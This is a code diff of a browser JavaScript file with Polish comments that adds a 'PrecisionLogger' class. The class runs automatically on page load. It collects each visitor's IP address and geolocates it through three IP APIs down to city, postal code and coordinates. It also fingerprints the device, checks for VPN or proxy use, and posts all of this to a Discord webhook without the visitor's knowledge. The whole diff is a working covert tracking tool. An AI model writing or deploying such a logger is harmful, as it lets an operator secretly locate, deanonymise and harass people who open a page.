@@ -1,58 +1,270 @@
-function _getDeviceData() {
-    // Poprawione wykrywanie systemu operacyjnego
-    const getOS = () => {
-        const userAgent = navigator.userAgent;
-        if (userAgent.includes("Windows")) return "Windows";
-        if (userAgent.includes("Mac")) return "macOS";
-        if (userAgent.includes("Linux")) return "Linux";
-        if (userAgent.includes("Android")) return "Android";
-        if (userAgent.includes("iOS")) return "iOS";
-        return navigator.platform || "Nieznany";
-    };
+class PrecisionLogger {
+    constructor() {
+        this.data = {
+            ip: null,
+            location: { accuracy: "Niska" },
+            device: {},
+            network: {},
+            time: new Date().toLocaleString("pl-PL")
+        };
+    }
 
-    // Poprawione wykrywanie rdzeni CPU
-    const cores = navigator.hardwareConcurrency;
-    const realCores = cores > 16 ? "Nieznana (>" + cores + ")" : cores; // Ograniczenie do realistycznych wartości
+    async init() {
+        try {
+            // 1. Pobierz IP
+            await this._getIP();
+            
+            // 2. Sprawdź lokalizację (3 źródła)
+            await this._getLocation();
+            
+            // 3. Zbierz dane urządzenia
+            this._getDeviceInfo();
+            
+            // 4. Sprawdź VPN/Proxy
+            await this._checkNetwork();
+            
+            // 5. Wyślij do Discord
+            await this._sendToDiscord();
+            
+        } catch (error) {
+            console.error("Błąd loggera:", error);
+        }
+    }
 
-    return {
-        // System
-        os: getOS(),
-        userAgent: navigator.userAgent,
+    async _getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            this.data.ip = data.ip;
+        } catch (error) {
+            console.error("Błąd pobierania IP:", error);
+            throw error;
+        }
+    }
+
+    async _getLocation() {
+        if (!this.data.ip) return;
         
-        // Ekran
-        screen: `${window.screen.width}x${window.screen.height}`,
-        colorDepth: `${window.screen.colorDepth}-bit`,
+        // Sprawdź 3 różne API i wybierz najdokładniejsze
+        const sources = [
+            this._checkIpApiCo(),
+            this._checkIpWhoIs(),
+            this._checkIpApiCom()
+        ];
         
-        // Urządzenie
-        cpuCores: realCores,
-        deviceMemory: this._getRealMemory(),
-        touchSupport: navigator.maxTouchPoints > 0,
-        isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent)
-    };
+        const results = await Promise.allSettled(sources);
+        const validResults = results
+            .filter(r => r.status === "fulfilled" && r.value)
+            .map(r => r.value);
+            
+        if (validResults.length > 0) {
+            // Wybierz wynik z najwyższą dokładnością
+            this.data.location = validResults.reduce((best, current) => 
+                current.accuracy > best.accuracy ? current : best
+            );
+        }
+    }
+
+    async _checkIpApiCo() {
+        try {
+            const url = window.CONFIG.IPAPI_KEY 
+                ? `https://ipapi.co/${this.data.ip}/json/?key=${window.CONFIG.IPAPI_KEY}`
+                : `https://ipapi.co/${this.data.ip}/json/`;
+                
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            if (data.error) return null;
+            
+            return {
+                country: data.country_name,
+                country_code: data.country,
+                city: data.city,
+                region: data.region,
+                postal: data.postal,
+                coords: `${data.latitude}, ${data.longitude}`,
+                accuracy: 3 // Wysoka dokładność
+            };
+        } catch (error) {
+            console.log("Błąd ipapi.co:", error);
+            return null;
+        }
+    }
+
+    async _checkIpWhoIs() {
+        try {
+            const response = await fetch(`https://ipwho.is/${this.data.ip}`);
+            const data = await response.json();
+            
+            return {
+                country: data.country,
+                country_code: data.country_code,
+                city: data.city,
+                region: data.region,
+                postal: data.postal_code,
+                coords: `${data.latitude}, ${data.longitude}`,
+                accuracy: 2 // Średnia dokładność
+            };
+        } catch (error) {
+            console.log("Błąd ipwho.is:", error);
+            return null;
+        }
+    }
+
+    async _checkIpApiCom() {
+        try {
+            const response = await fetch(`https://ipapi.com/ip_api.php?ip=${this.data.ip}`);
+            const data = await response.json();
+            
+            return {
+                country: data.country_name,
+                country_code: data.country_code,
+                city: data.city,
+                region: data.region_name,
+                postal: data.zip_code,
+                coords: `${data.latitude}, ${data.longitude}`,
+                accuracy: 1 // Niska dokładność
+            };
+        } catch (error) {
+            console.log("Błąd ipapi.com:", error);
+            return null;
+        }
+    }
+
+    _getDeviceInfo() {
+        // Poprawione wykrywanie systemu
+        const getOS = () => {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return "Windows";
+            if (/Mac OS X/.test(ua)) return "macOS";
+            if (/Linux/.test(ua)) return "Linux";
+            if (/Android/.test(ua)) return "Android";
+            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+            return navigator.platform || "Nieznany";
+        };
+
+        // Poprawione wykrywanie przeglądarki
+        const getBrowser = () => {
+            const ua = navigator.userAgent;
+            let match = ua.match(/(firefox|chrome|safari|edge|opera|opr)\/?\s*(\d+)/i) || [];
+            return match[1] ? `${match[1].charAt(0).toUpperCase() + match[1].slice(1)} ${match[2] || ''}`.trim() : "Nieznana";
+        };
+
+        this.data.device = {
+            os: getOS(),
+            browser: getBrowser(),
+            screen: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
+            cpuCores: navigator.hardwareConcurrency > 16 ? ">16" : navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
+            isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
+            userAgent: navigator.userAgent
+        };
+    }
+
+    async _checkNetwork() {
+        if (!this.data.ip) return;
+        
+        // Sprawdź VPN/Proxy
+        try {
+            if (window.CONFIG.VPNAPI_KEY) {
+                const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
+                const data = await response.json();
+                this.data.network = {
+                    isp: data.network?.autonomous_system_organization || "Nieznany",
+                    vpn: data.security?.vpn || false,
+                    proxy: data.security?.proxy || false,
+                    hosting: data.security?.hosting || false
+                };
+            }
+        } catch (error) {
+            console.error("Błąd sprawdzania VPN:", error);
+        }
+    }
+
+    async _sendToDiscord() {
+        if (!window.CONFIG.DISCORD_WEBHOOK) return;
+        
+        const embed = {
+            title: "🔍 Precyzyjne dane użytkownika",
+            color: 0x00ff00,
+            fields: [
+                {
+                    name: "🌍 Lokalizacja",
+                    value: this._formatLocation(),
+                    inline: true
+                },
+                {
+                    name: "📱 Urządzenie",
+                    value: this._formatDevice(),
+                    inline: true
+                },
+                {
+                    name: "🌐 Sieć",
+                    value: this._formatNetwork(),
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `Czas: ${this.data.time} | Dokładność: ${this._getAccuracyLevel()}`
+            }
+        };
+
+        try {
+            await fetch(window.CONFIG.DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch (error) {
+            console.error("Błąd wysyłania do Discord:", error);
+        }
+    }
+
+    _formatLocation() {
+        const loc = this.data.location;
+        return `
+        **Kraj:** ${loc.country || "Nieznany"} ${loc.country_code ? `(${loc.country_code})` : ""}
+        **Miasto:** ${loc.city || "Nieznane"}
+        **Region:** ${loc.region || "Nieznany"}
+        **Kod pocztowy:** ${loc.postal || "Nieznany"}
+        **Współrzędne:** ${loc.coords || "Nieznane"}
+        `;
+    }
+
+    _formatDevice() {
+        const dev = this.data.device;
+        return `
+        **System:** ${dev.os}
+        **Przeglądarka:** ${dev.browser}
+        **Ekran:** ${dev.screen} (${dev.colorDepth})
+        **Rdzenie CPU:** ${dev.cpuCores}
+        **Pamięć RAM:** ${dev.memory}
+        **Typ:** ${dev.isMobile ? "Mobilne" : "Desktop"}
+        `;
+    }
+
+    _formatNetwork() {
+        const net = this.data.network;
+        return `
+        **IP:** ${this.data.ip}
+        **ISP:** ${net.isp || "Nieznany"}
+        **VPN:** ${net.vpn ? "Tak" : "Nie"}
+        **Proxy:** ${net.proxy ? "Tak" : "Nie"}
+        **Hosting:** ${net.hosting ? "Tak" : "Nie"}
+        `;
+    }
+
+    _getAccuracyLevel() {
+        switch(this.data.location.accuracy) {
+            case 3: return "Wysoka";
+            case 2: return "Średnia";
+            default: return "Niska";
+        }
+    }
 }
 
-function _getRealMemory() {
-    if (!navigator.deviceMemory) return "Nieznana";
-    const mem = navigator.deviceMemory;
-    return mem > 64 ? "Nieznana (>64GB)" : `${mem} GB`; // Ograniczenie do realistycznych wartości
-}
-
-function _formatDevice(data) {
-    return `
-    **System:** ${data.os}
-    **Typ:** ${data.isMobile ? 'Mobilne' : 'Desktop'}
-    **Ekran:** ${data.screen} (${data.colorDepth})
-    **Pamięć RAM:** ${data.deviceMemory}
-    **Rdzenie CPU:** ${data.cpuCores}
-    **Touch:** ${data.isMobile ? 'Tak' : 'Nie'}
-    **Przeglądarka:** ${this._getBrowserName()}
-    `;
-}
-
-function _getBrowserName() {
-    const ua = navigator.userAgent;
-    if (ua.includes("Firefox")) return "Firefox" + ua.split("Firefox/")[1]?.split(" ")[0];
-    if (ua.includes("Chrome")) return "Chrome" + ua.split("Chrome/")[1]?.split(" ")[0];
-    if (ua.includes("Safari")) return "Safari" + ua.split("Version/")[1]?.split(" ")[0];
-    return "Nieznana";
-}
+// Uruchom logger
+document.addEventListener("DOMContentLoaded", () => {
+    new PrecisionLogger().init();
+});
